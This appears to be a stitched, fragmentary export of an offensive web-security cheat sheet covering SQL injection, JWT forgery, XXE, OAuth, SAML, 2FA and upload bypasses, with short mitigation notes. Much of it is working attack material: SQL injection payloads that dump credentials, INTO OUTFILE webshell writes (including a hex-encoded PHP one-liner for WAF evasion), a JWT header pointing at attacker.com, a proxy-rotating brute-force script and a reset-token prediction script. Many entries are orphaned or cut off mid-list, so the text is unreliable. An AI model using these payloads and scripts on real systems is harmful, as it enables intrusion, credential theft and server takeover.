name: MySQL injection - Basic probing
description: MySQL database injection basic probing and data extraction techniques
prerequisites: The target has a SQL injection point

execution.title: 1. Probe the injection point
execution.description: Use a single quote and boolean conditions to probe whether an injection point exists

execution.title: 2. Determine the number of columns
execution.command:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Increment until an error, to determine the column count
Or use:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
execution.description: Use ORDER BY or UNION SELECT NULL to determine the number of columns in the query

execution.title: 3. Determine the displayed positions
execution.command:
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
execution.description: Find which columns are displayed on the page

execution.title: 4. Obtain database information

' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
execution.description: Obtain basic information such as the current database name, user, and version

execution.title: 5. Enumerate all databases
execution.command:
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
execution.description: Obtain all database names on the MySQL server

' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
execution.description: Obtain all table names in the specified database

syntaxBreakdown.explanation: System table storing all table information
The database name the table belongs to

execution.title: 7. Enumerate column names
execution.command:
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
execution.description: Obtain all column names of the specified table

syntaxBreakdown.explanation: System table storing all column information

execution.title: 8. Extract data
execution.command:
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
execution.description: Extract sensitive data from the target table

Limit to returning the first row of results

syntaxBreakdown.explanation: Mixed case bypasses simple keyword matching

wafBypass.description: Use MySQL-specific inline comments to bypass

Specifies execution on MySQL version 5.00.00 and above

After the WAF removes SELECT it becomes SELECT

wafBypass.description: Use encoding functions to bypass keyword detection

tutorial.overview: MySQL injection is the most common type of database injection; by crafting malicious SQL statements an attacker obtains or modifies database data. An attacker can leverage injection vulnerabilities to read sensitive data, write a WebShell, and even execute system commands.
tutorial.vulnerability: The application does not sufficiently filter user input and concatenates it directly into the SQL statement for execution. Commonly found in input points such as search boxes, login forms, and URL parameters.
tutorial.exploitation:
Full exploitation workflow:
1. Probe the injection point: use single quotes and boolean conditions to confirm whether injection exists
2. Determine the number of columns: use ORDER BY or UNION SELECT NULL
3. Determine displayed positions: find which columns are reflected on the page
4. Obtain database information: database(), user(), version()
5. Enumerate the database structure: the information_schema database
6. Extract sensitive data: usernames, passwords, etc.
7. Attempt privilege escalation: file read/write, UDF privilege escalation
tutorial.mitigation:
Defensive measures:
1. Use parameterized queries (PDO, prepared statements)
2. Input validation and whitelist filtering
3. Principle of least privilege, restrict database user privileges
4. Disable or restrict the FILE privilege
5. Set secure_file_priv to NULL
6. Deploy WAF protection
7. Do not leak database details in error messages

execution.title: 2. Obtain the website path

' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
execution.description: Use load_file to read sensitive system files

execution.title: 4. Write a WebShell

' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
execution.description: Use INTO OUTFILE to write a WebShell

execution.title: 5. Write a shell via the log
execution.description: Write a shell by enabling general_log

execution.title: 6. UDF privilege escalation
execution.description: Use UDF privilege escalation to execute system commands

wafBypass.command: ' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
wafBypass.description: Use hex encoding to bypass keyword detection

syntaxBreakdown.explanation: Hex encoding of a PHP one-liner

wafBypass.description: Use the CHAR function to encode and bypass

tutorial.overview: MySQL advanced injection techniques can achieve file reads, WebShell writes, and even system command execution. These techniques require relatively high database privileges and specific configuration conditions.
tutorial.vulnerability: The MySQL FILE privilege allows reading and writing files; combined with a misconfigured secure_file_priv it can lead to serious consequences. UDF privilege escalation can execute arbitrary system commands.
tutorial.exploitation:
Full exploitation workflow:
1. Check the FILE privilege and secure_file_priv configuration
2. Obtain the website's absolute path
3. Use load_file to read sensitive configuration
4. Use INTO OUTFILE to write a WebShell
5. If OUTFILE is disabled, write a shell via the log
6. Attempt UDF privilege escalation to obtain a system shell
tutorial.mitigation:
Defensive measures:
1. Restrict the FILE privilege, do not grant it to the web application user
2. Set secure_file_priv=NULL to prohibit file operations
3. Disable INTO OUTFILE and INTO DUMPFILE
4. Use AppArmor/SELinux to restrict MySQL file access
5. Monitor abnormal file read/write operations

2. Principle of least privilege

tutorial.exploitation:
Full exploitation workflow:
1. Check Java privileges
2. Use DBMS_JAVA to execute commands
3. Or use UTL_FILE to read/write files
tutorial.mitigation: Defending against Oracle advanced injection requires: restricting database user privileges (revoke EXECUTE on packages such as UTL_HTTP and DBMS_XMLGEN), enabling Oracle auditing, using bind variables rather than string concatenation, and configuring network ACLs to restrict outbound connections.

tutorial.overview: SQLite is an embedded database engine widely used in mobile applications, desktop software, and small web applications. Its injection testing requires understanding SQLite-specific syntax and the structure of the system table (sqlite_master).
tutorial.vulnerability: The particularity of SQLite injection lies in: enumerating all table and view definitions via the sqlite_master table, using typeof() to determine column types, using group_concat() to aggregate multiple rows of data, and ATTACH DATABASE to create a new database file to achieve a file-write operation.
tutorial.exploitation: SQLite injection steps: 1) Obtain the table structure via sqlite_master 2) Use UNION SELECT to extract data 3) Use ATTACH DATABASE to write a webshell to an accessible directory 4) Or use load_extension() to load a malicious shared library to execute code.
tutorial.mitigation: Defending against SQLite injection: use parameterized queries (PreparedStatement), strictly validate and filter user input, restrict database file permissions to prevent ATTACH operations, disable the load_extension() feature, and store database files outside the web root.

tutorial.overview: SQL blind injection refers to scenarios where injection succeeds but the page does not directly reflect data; data must be inferred character by character via conditional judgments (boolean blind injection) or time delays (time-based blind injection). It is the most common type of injection in practice.
tutorial.vulnerability: SQL blind injection vulnerabilities exist in all queries that are not properly parameterized. An attacker crafts boolean conditions (AND 1=1 vs AND 1=2) to observe page differences, or uses delay functions such as SLEEP/BENCHMARK to determine whether a condition is true or false, extracting arbitrary information from the database bit by bit.
tutorial.exploitation:
Full exploitation workflow:
1. Confirm that boolean blind injection exists
2. Enumerate the data length
3. Extract data character by character
4. Use a tool to automate
tutorial.mitigation: Defending against SQL blind injection: use parameterized queries/prepared statements, implement WAF rules to detect abnormal conditional statements and delay functions, monitor the slow query log to discover abnormal SLEEP requests, set a database query timeout limit, and deploy RASP to detect SQL injection behavior in real time.

tutorial.overview: SQL time-based blind injection determines whether a condition is true or false by injecting delay functions (such as SLEEP/WAITFOR/pg_sleep). It applies to scenarios where the page shows no observable differences at all, and is the stealthiest but least efficient injection method.
tutorial.vulnerability: SQL time-based blind injection leverages the databases' built-in delay capabilities: MySQL's SLEEP() and BENCHMARK(), MSSQL's WAITFOR DELAY, PostgreSQL's pg_sleep(), and Oracle's DBMS_LOCK.SLEEP(). Delays are triggered under conditional statements to infer the target data character by character.
tutorial.exploitation:
Full exploitation workflow:
1. Confirm that time-based blind injection exists
2. Enumerate the data length
3. Extract character by character
4. Automate with sqlmap
tutorial.mitigation: Defending against SQL time-based blind injection: besides parameterized queries, set strict database query timeouts (for example 5 seconds), monitor abnormal slow-query patterns, have the WAF detect delay-function keywords such as SLEEP/WAITFOR/BENCHMARK, and limit the number of concurrent queries per IP.

tutorial.overview: SQL error-based injection uses database error messages to reflect data directly. By crafting specific function calls (such as updatexml/extractvalue/exp), the database outputs query results inside the error message, which is far more efficient than blind injection.
tutorial.vulnerability: SQL error-based injection takes advantage of the database exposing internal data in error messages when it processes invalid input: MySQL's updatexml()/extractvalue()/exp() overflow, MSSQL's convert()/cast() type-conversion errors, PostgreSQL's cast() errors, and functions such as Oracle's XMLType().
tutorial.exploitation:
Full exploitation workflow:
1. Confirm that error-based injection exists
2. Use extractvalue/updatexml to extract data
3. Enumerate the database structure
4. Extract sensitive data
tutorial.mitigation: Defending against SQL error-based injection: verbose error display must be disabled in production (display_errors=off), use custom error pages instead of default database errors, log errors but never show them to users, and use parameterized queries to prevent injection at the root.

tutorial.overview: Second-order SQL injection means that malicious input is correctly escaped when first stored, but is then used directly without escaping in a later query, causing the injection to trigger. Because input and trigger are separated, this class of vulnerability is extremely hard for automated tools to find.
tutorial.vulnerability: The root cause of second-order SQL injection is that developers use parameterized queries or escaping when writing data, but concatenate that data straight into SQL statements when reading and reusing it. A typical scenario is storing a malicious username at registration and triggering the injection during a password change.
tutorial.exploitation: Second-order injection steps: 1) Register a username containing a SQL payload (such as admin'-- ) 2) Log in to that account normally 3) Trigger a feature that uses that username (such as changing the password) 4) The backend SQL concatenates the unescaped username, causing the injection to trigger 5) Use that injection to steal or modify other users' data.
tutorial.mitigation: Defending against second-order injection: use parameterized queries for all data on every use, not only when writing, but also when the data is read and reused. Establish secure coding standards: any data coming from the database should be treated as untrusted input.

2. Build the data:// payload
3. Execute the PHP code
4. Get a shell
tutorial.mitigation:

2. Disable the data:// wrapper
3. Whitelist validation
4. Filter special characters

tutorial.overview: The /proc file system (a Linux virtual file system) contains a great deal of system runtime information. tutorial.overview: CSRF (Cross-Site Request Forgery) exploits the browser's behavior of automatically attaching cookies, luring an authenticated user into performing an operation the attacker has prepared without their knowledge (such as transferring money, changing a password, or changing an email address).
tutorial.vulnerability: CSRF vulnerabilities exist in sensitive operations that lack request origin validation. The browser automatically attaches cookies when sending a same-site request, so the attacker builds a page containing a malicious form or request, and once the victim visits it the browser automatically sends the request as that user. Key conditions: the operation relies only on cookie authentication and there is no CSRF token validation.
tutorial.exploitation:
Full exploitation flow:
1. Find a sensitive operation
2. Analyze the request format
3. Build a malicious page
4. Lure the victim into visiting it
5. The malicious request executes automatically
tutorial.mitigation:
Defensive measures:
1. Use a CSRF token
2. Validate the Referer header
3. Use the SameSite cookie attribute
4. Require secondary verification for critical operations

wafBypass.command:
# JWK embedded public key injection:
# Embed the attacker's public key in the JWT header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# The server verifies the signature using the JWK from the header

{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# The server fetches the key from a URL the attacker controls
wafBypass.description: By injecting jwk (an embedded key) or jku (a remote key set URL) into the JWT header pointing at attacker-controlled keys, the server is made to verify the signature with the attacker's key

wafBypass.title: x5c certificate chain injection
wafBypass.command:
# Generate a self-signed certificate:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# Build the JWT header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# Sign with the attacker's private key and put the attacker's certificate in x5c
# The server extracts the public key from x5c to verify the signature, so a self-signed cert from the attacker passes

# Using jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
wafBypass.description: By injecting an attacker self-signed certificate chain via the x5c header, the server extracts the public key from the certificate for verification, so the attacker can forge any JWT by signing with the corresponding private key

tutorial.overview: JWT (JSON Web Token) is the most widely used authentication mechanism in modern web applications. Its security flaws include algorithm confusion (none/HS256 to RS256), key brute forcing, unverified signatures, and claim tampering, which can lead to authentication bypass and privilege escalation.
tutorial.vulnerability: JWT security vulnerabilities: 1) alg:none flaw (signature not verified) 2) HS256/RS256 algorithm confusion (using the public key as the HMAC secret) 3) weak keys that can be brute forced with a dictionary 4) exp not verified, so the token never expires 5) kid parameter injection (directory traversal / SQL injection) 6) jku/x5u headers pointing at malicious keys.
tutorial.exploitation:
Full exploitation flow:
1. Obtain the JWT token
2. Decode and analyze the contents
3. Try the None algorithm bypass
4. Try cracking the weak key
5. Modify the payload to escalate privileges
tutorial.mitigation:
Defensive measures:
1. Use strong keys
2. Disable the None algorithm
3. Verify signatures correctly
4. Set a reasonable expiration time
5. Transport over HTTPS

tutorial.overview: Blind XXE refers to a scenario where XML external entity injection succeeds but the entity content is not directly shown in the response; the read file content must be exfiltrated to an attacker-controlled server via out-of-band (OOB) techniques over HTTP/DNS, etc.
tutorial.vulnerability: Blind XXE uses parameter entities (%entity) and an external DTD to achieve data exfiltration: define nested entity references in the external DTD to concatenate file content into an HTTP request URL sent to the attacker's server. Some XML parsers restrict entity nesting, requiring different exfiltration strategies.
tutorial.exploitation:
Full exploitation flow:
1. Confirm XXE exists
2. Use parameter entities
3. Construct OOB exfiltration
4. Obtain sensitive data
tutorial.mitigation: Defending against Blind XXE: disable XML external entities and DTD processing (most effective), use JSON instead of XML format, configure a network-layer outbound traffic whitelist to block OOB data exfiltration, deploy a WAF to detect DTD declarations and entity references, and monitor abnormal DNS/HTTP outbound requests.

tutorial.overview: XXE OOB (Out-of-Band) data exfiltration is the core exploitation technique of Blind XXE; it transmits internal server data to the attacker via external channels such as HTTP/FTP/DNS, and is the key step that takes an XXE vulnerability from detection to actual data extraction.
tutorial.vulnerability: XXE OOB is achieved through multi-layer parameter entity nesting: 1) the first entity reads the target file 2) the second entity (external DTD) concatenates the file content into an HTTP URL 3) the parser requests that URL, sending the data to the attacker. The FTP protocol can exfiltrate multi-line content, and DNS can serve as a covert channel in strict network environments.

4. Receive and parse the data
tutorial.mitigation: Defending against XXE OOB: completely disable external entity processing and DTD loading, configure a strict outbound network policy (allow only necessary whitelisted outbound), monitor abnormal DNS queries and HTTP outbound requests, and use RASP to detect file access and network request behavior during XML parsing.

tutorial.overview: The JWT none algorithm attack abuses the fact that some JWT libraries accept tokens whose alg field is "none" (meaning no signature verification is required). Libraries that support the none algorithm will skip signature verification.

tutorial.overview: The JWT Algorithm Confusion attack changes an RS256 (asymmetric) signature to HS256 (symmetric), then uses the public key (usually obtainable) as the HMAC secret to sign the token. If the server verifies using the same key variable, the attack succeeds.
tutorial.vulnerability: How the JWT key confusion attack works: RS256 signs with the private key and verifies with the public key, while HS256 signs and verifies with a shared secret. 4. Separate the verification logic for public keys and symmetric keys

tutorial.overview: BOLA (Broken Object Level Authorization) is the number one vulnerability in the OWASP API Top 10. It refers to an API lacking proper authorization checks at the object level, allowing an authenticated user to access or manipulate resource objects that do not belong to them.
tutorial.vulnerability: BOLA is closely related to IDOR but places more emphasis on the authorization-layer flaw: 1) The API only verifies that the user is logged in but does not verify object ownership 2) Iterating over IDs allows bulk retrieval of all users' data 3) In GraphQL, arbitrary objects can be accessed directly via node IDs 4) Missing authorization on related objects (accessing another user's sub-resources).
tutorial.exploitation:
Full exploitation workflow:
1. Identify APIs that use object IDs
2. Create multiple test accounts
3. Test cross-account access
4. Enumerate other objects
5. Attempt modify/delete operations
tutorial.mitigation:
Defenses:
1. Enforce object-level authorization checks
2. Verify the user's ownership of the resource
3. Use unpredictable IDs
4. Log abnormal access
5. Enforce rate limiting

# Python encryption script
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # Generate the payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()

tutorial.overview: File upload bypass techniques target the file upload protection mechanisms of web applications. By modifying the file extension, tampering with the MIME type, content-type confusion, double extensions, truncation characters, image-with-code (webshell image) and other methods, they bypass whitelist/blacklist detection, ultimately uploading an executable malicious file (such as a Webshell) to gain control of the server
tutorial.vulnerability: Flaws in file upload validation mechanisms include: relying solely on client-side JavaScript validation, checking only the Content-Type header without validating the actual content, an incomplete blacklist (missing variants such as php5/phtml/phar), not renaming and isolating uploaded files, the upload directory having script execution permission, not detecting the file header magic bytes, and parsing vulnerabilities causing non-standard extensions to be executed
tutorial.exploitation: First test the normal upload flow to confirm the allowed file types, then try in turn: changing Content-Type to image/jpeg, using a double extension (test.php.jpg), adding null-byte truncation (test.php%00.jpg), exploiting a Windows feature (test.php::$DATA), case variants (test.PhP), .htaccess override, image-with-code (appending PHP code to the end of a legitimate image), etc.; after a successful upload, verify whether the file can be parsed and executed
tutorial.mitigation: Strictly validate the file type server-side (check the file header magic bytes rather than the extension); rename uploaded files (using a UUID); forbid script execution permission in the upload directory; isolate file storage from the web root; use a dedicated file service domain; re-render image files to strip embedded code; limit the size and frequency of uploaded files

tutorial.overview: Web cache poisoning exploits the inconsistency between the caching server's cache key and the actual response content. By injecting malicious content into non-cache-key HTTP headers or parameters, the caching server stores a response containing the malicious payload, and all subsequent users accessing the same URL will receive the poisoned response
tutorial.vulnerability: The root cause of cache poisoning is that the cache key usually only includes the URL path and a few parameters, while a web application may reflect non-cache-key HTTP headers (such as X-Forwarded-Host, X-Forwarded-Scheme) into the response. When an attacker injects malicious content through these headers, the caching server caches the response containing the malicious content and distributes it to all users
tutorial.exploitation: First identify the caching mechanism used by the target (via Cache-Control, Age, X-Cache and other response headers), then use tools such as Param Miner to probe for non-cache-key HTTP headers that can be reflected into the response, construct a header value containing malicious JavaScript (e.g. X-Forwarded-Host: evil.com), send the request to make the cache store the poisoned response, and verify whether subsequent normal requests without the malicious header return the poisoned content
tutorial.mitigation: Strictly configure the cache key to include all parameters and headers that affect the response content; strictly validate and encode HTTP header values reflected into the response; use the Vary header to correctly declare the HTTP headers that affect the response; configure the cache to not cache responses containing user-specific content; regularly audit the cache configuration and purge suspicious cached content

tutorial.overview: HTTP request smuggling (the CL-TE type) exploits the different priority parsing of the Content-Length and Transfer-Encoding headers by the front-end server (such as a reverse proxy) and the back-end server, to "smuggle" a malicious request into another normal request, achieving attack effects such as bypassing security controls, request hijacking and cache poisoning
tutorial.vulnerability: The HTTP/1.1 specification stipulates that when Content-Length and Transfer-Encoding are both present, Transfer-Encoding takes precedence. However, different server implementations are inconsistent: the front-end may prioritize Content-Length to determine the request boundary, while the back-end prioritizes Transfer-Encoding. This parsing difference causes what the front-end sees as one request to be split into two requests at the back-end
tutorial.exploitation: First probe for a CL-TE smuggling vulnerability using timing-difference (Timing) techniques, construct a request containing both Content-Length and Transfer-Encoding: chunked so the front-end parses and forwards it as one complete request according to CL, while the back-end parses it according to TE and the remaining part becomes the prefix of the next request; then use the smuggled prefix to achieve request hijacking, bypass access control, and steal other users' request data
tutorial.mitigation: Have the front-end and back-end uniformly use the HTTP/2 protocol to avoid parsing ambiguity; configure the front-end proxy to normalize request headers and reject requests with ambiguous headers; configure the back-end server to reject requests containing both Content-Length and Transfer-Encoding; deploy dedicated request smuggling detection rules; use end-to-end encryption to prevent middleware from tampering with requests

tutorial.overview: An open redirect vulnerability lets an attacker tamper with a URL parameter to redirect users from a trusted domain to an arbitrary external malicious site. It is commonly used for phishing (leveraging the credibility of the trusted domain), OAuth token theft, and bypassing SSRF protections, and is an important supporting technique for social engineering attacks
tutorial.vulnerability: When handling redirect URL parameters (such as redirect_url, return_to, next), the application does not strictly validate the target URL against a whitelist and performs only a simple domain substring check (for example checking whether the string trusted.com is present), which an attacker can bypass with URL encoding, by adding a subdomain (trusted.com.evil.com), or by using the @ symbol (trusted.com@evil.com)
tutorial.exploitation: First identify every redirect parameter in the application (via crawling, JS analysis, and the login/logout flows), then test changing the redirect target to an external domain. If it is blocked, try bypass techniques: double URL encoding, protocol-relative URLs (//evil.com), the @ symbol (https://trusted.com@evil.com), adding the trusted domain as a subdomain (https://evil.com/trusted.com), backslashes (https://trusted.com\\@evil.com), and so on
tutorial.mitigation: Enforce strict whitelist validation and only allow redirects to a predefined list of trusted domains; use relative paths rather than full URLs for in-site redirects; sign the redirect URL parameter to prevent tampering; display an intermediate confirmation page to the user before redirecting; configure the Content Security Policy (CSP) navigate-to directive to restrict navigable domains

execution.title: Distributed brute forcing and IP rotation
execution.command:
# Use a proxy pool for distributed brute forcing:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")
execution.description: Use a proxy pool to rotate IPs and avoid bans while running a distributed brute force

tutorial.overview: Session hijacking attacks abuse flaws in a web application's session management to take over an authenticated user's session. Common techniques include session fixation (pre-setting the sessionId), session sniffing (cleartext HTTP transmission), session prediction (weak random numbers), and stealing cookies via XSS.
tutorial.vulnerability: Common session management flaws: 1) Cookies missing the HttpOnly/Secure/SameSite attributes 2) The sessionId is not regenerated after login (leading to session fixation) 3) The sessionId has insufficient entropy and can be predicted 4) Session cookies are transmitted in cleartext over HTTP 5) Sessions never time out or the timeout is too long

execution.command:
# Request password reset tokens in bulk to analyze the pattern:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # Obtain the token from the mail API or the response
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# Analyze the token pattern:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# Check whether it is based on a timestamp:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")

tutorial.overview: Password reset vulnerabilities are among the most common logic flaws in authentication mechanisms, covering attack vectors such as predictable reset tokens, token leakage, Host header injection, and parameter tampering. tutorial.vulnerability: Common flaws in the password reset flow include: the reset token generation algorithm is predictable (for example based on a timestamp or user ID), the token has no expiry or an excessively long one, the token is not invalidated immediately after use (allowing replay), the link in the reset email is controlled by the Host header (Host header injection), the reset verification code is too short to resist brute forcing, and modifying the user identifier parameter lets you reset someone else's password
tutorial.exploitation: First analyze the complete request chain of the password reset flow, test the predictability of the reset token (collect several tokens and analyze the pattern), try Host header injection (change Host to an attacker-controlled domain so the reset link points to a malicious server), test parameter tampering (submit your own email together with the target user ID), and check whether the verification code can be brute forced (4-6 digits with no rate limiting)
tutorial.mitigation: Generate reset tokens with a cryptographically secure random source (at least 128 bits); give tokens a short validity window (15-30 minutes) and invalidate them immediately after use; fix the domain in the reset email so it is not influenced by the Host header; use at least a 6-digit verification code and limit the number of attempts; take the user identifier for the reset operation only from the server-side session, never from a client parameter; log every password reset operation and support anomaly alerting

tutorial.overview: OAuth authentication vulnerabilities cover a range of security flaws in the OAuth 2.0 authorization flow, including a missing CSRF state parameter, authorization code leakage, token hijacking, lax redirect_uri validation, client secret leakage, and scope escalation, all of which can lead to account takeover or unauthorized access to sensitive resources
tutorial.vulnerability: Common flaws in OAuth 2.0 implementations: lax redirect_uri validation (allowing subpaths or open redirects) leaking the authorization code or token to an attacker-controlled endpoint, a missing state parameter causing CSRF, an authorization code not bound to the client and therefore replayable, the access_token being exposed directly in the URL fragment in the Implicit Grant, and the client ID/secret being hardcoded in front-end code or mobile apps
tutorial.exploitation: First analyze the OAuth authorization flow end to end (intercept traffic and observe the authorize and token endpoint parameters), test whether redirect_uri can be changed to an attacker-controlled URL (try subpaths, URL encoding, open redirect chains), check whether the state parameter exists and is validated, analyze front-end JS and mobile app code for a leaked client secret, and test whether the scope parameter can be escalated to obtain more privileges
tutorial.mitigation: Validate redirect_uri strictly using exact matching rather than prefix matching; require a state parameter to prevent CSRF and validate it server-side; use PKCE (Proof Key for Code Exchange) to harden the authorization code flow; avoid the implicit grant; keep the client secret confidential and never hardcode it in the client; enforce token binding and least-privilege scope policies

tutorial.overview: SAML authentication vulnerabilities involve advanced techniques such as assertion signature bypass, XML Signature Wrapping (XSW) attacks, assertion injection, and replay attacks. In enterprise SSO environments they enable identity forgery, letting an attacker log into SAML-protected applications as any user, typically affecting the entire enterprise application ecosystem
tutorial.vulnerability: Common security flaws in SAML implementations: signature validation is not strict (only checking that a signature exists rather than which elements it covers), susceptibility to XML Signature Wrapping (XSW, where the signature is relocated so the validated element differs from the assertion element actually used), failure to check the assertion's Recipient/Audience/NotOnOrAfter attributes, replayable assertions, and XML comment injection bypassing attribute parsing
tutorial.exploitation: First capture the SAMLResponse from a normal SAML authentication flow (Base64-decode it to get the XML) and analyze the signature coverage and assertion structure. Test XSW attacks: duplicate the element referenced by the legitimate signature and insert a forged user identity into the assertion so that signature validation passes but the SP consumes the forged assertion. Test XML comment injection: insert a comment inside NameID to truncate the username (for example admin<!--x]-->@evil.com). Test assertion replay and expiry validation
tutorial.mitigation: Use a security-audited SAML library (such as the OneLogin/OASIS reference implementations); when validating the XML signature, ensure it covers the assertion element actually used; strictly validate Audience, Recipient, NotOnOrAfter, and similar attributes; implement a unique assertion ID anti-replay mechanism; apply XML schema validation to SAML responses to prevent injection; enable encrypted assertions to protect data in transit

tutorial.overview: Two-factor authentication (2FA) bypass techniques target implementation flaws in second-factor mechanisms such as TOTP, SMS, and email codes, defeating 2FA protection through logic flaws, brute forcing, response tampering, and step skipping. A successful bypass means account security falls back to password-only protection
tutorial.vulnerability: Common flaws in 2FA implementations: codes that are too short (4-6 digits) with no rate limiting, allowing brute forcing; the 2FA step can be skipped (by going straight to a post-authentication page); the code is not bound to the session (account A's code can verify account B); the backup recovery code generation algorithm is predictable; the success/failure response can be tampered with on the client; the 2FA state is stored in a cookie that can be deleted to reset it
tutorial.exploitation: First test step skipping: after completing password verification, go straight to a post-authentication page without entering the 2FA code. Test brute forcing: analyze the code length and the response after failures (is there rate limiting). Test response tampering: intercept the 2FA verification response and change a failure into a success. Test session binding: try verifying account B with a valid code from account A. Test backup codes: analyze the recovery code format and whether the generation algorithm is predictable
tutorial.mitigation: Use at least 6-digit codes and cap the number of daily attempts (for example lock out after 5); enforce the 2FA verification state on the server rather than relying on client cookies or response content; bind codes strictly to a specific session and user; generate backup recovery codes with a cryptographically secure random source; apply progressive delays (increasing the wait after each failure); require 2FA re-verification for critical operations

tutorial.overview: CAPTCHA bypass techniques target implementation flaws in human verification mechanisms such as image CAPTCHAs, slider CAPTCHAs, and behavioral CAPTCHAs. Through CAPTCHA reuse, response leakage, OCR recognition, and API logic bypasses, they defeat CAPTCHA protection and make brute forcing, automated scraping, and bulk registration possible again
tutorial.vulnerability: Common flaws in CAPTCHA implementations: the answer is returned directly in the HTTP response (in a hidden field or comment); CAPTCHA validation is not bound to the business request (the CAPTCHA and the business operation can be sent separately); the token issued after a successful CAPTCHA can be reused (verify once, use many times); simple image CAPTCHAs can be recognized with high accuracy by OCR; the validation parameters of a slider CAPTCHA can be constructed directly
tutorial.exploitation: First analyze the complete CAPTCHA validation flow (front-end generation/retrieval, user input, backend verification). Check whether the response leaks the answer (inspect the HTML source, HTTP response headers, and cookies). Test whether the CAPTCHA can be reused (resubmit business requests with an already-validated CAPTCHA token). Test whether the request still succeeds after deleting the CAPTCHA parameter. Try OCR recognition against image CAPTCHAs (with tools such as Tesseract). Analyze whether the slider CAPTCHA request parameters can be constructed directly
tutorial.mitigation: Store the CAPTCHA answer strictly in the server-side session and never return it in a response; bind the CAPTCHA to the business request with a single-use token that is invalidated immediately after validation; adopt a mature CAPTCHA service (such as reCAPTCHA/hCaptcha) to raise recognition difficulty; apply exponential backoff delays to failed requests; combine multiple risk-control signals such as IP reputation, device fingerprinting, and behavioral analysis

tutorial.overview: The "remember me" persistent-login vulnerability class involves issues such as a reversible Remember-Me cookie generation algorithm, predictable keys, and deserialization risks. By analyzing or forging the Remember-Me token an attacker can achieve persistent identity impersonation; a classic case is the Apache Shiro RememberMe deserialization vulnerability (CVE-2016-4437)
tutorial.vulnerability: Common flaws in the "remember me" feature: the cookie value stores user information with reversible encoding (such as Base64) rather than encryption or a signature; the encryption key is a default or hardcoded value (such as Shiro's default AES key); the cookie deserializes Java/PHP objects, leading to RCE; the cookie is not bound to a client IP or device fingerprint and can be replayed across devices; the cookie has an excessively long validity and cannot be forcibly revoked
tutorial.exploitation: First obtain the Remember-Me cookie value and analyze its format (Base64 decode, hex dump). Check whether it matches a known framework format (such as Shiro) and test the default keys. Analyze whether the cookie contains a tamperable user identifier (for example modifying the user ID or role field). For Java applications, test deserialization attacks (use ysoserial to generate a payload and replace the cookie content). Test whether the cookie can be replayed across IPs/devices
tutorial.mitigation: Use a cryptographically secure random token as the Remember-Me identifier and do not store user information in the cookie; change the framework's default encryption key (such as Shiro's rememberMe key); never use Java/PHP serialized objects in a cookie; bind the token to a client fingerprint (IP+UA+device ID); set a reasonable validity period (no more than 30 days is recommended); provide a log-out-all-devices feature to support token revocation

#!/bin/bash
# Bulk test common sensitive file paths
BASE="http://target.com/download?file="

tutorial.overview: A race condition vulnerability occurs in the time window after a file is uploaded and before the security check (deletion) happens. The server usually saves the file to a temporary directory first, then performs security checks (such as file type and content scanning), deleting the file if the check fails. A millisecond-scale window exists between saving and deleting, and an attacker who accesses the malicious file within that window using high concurrency can achieve RCE.
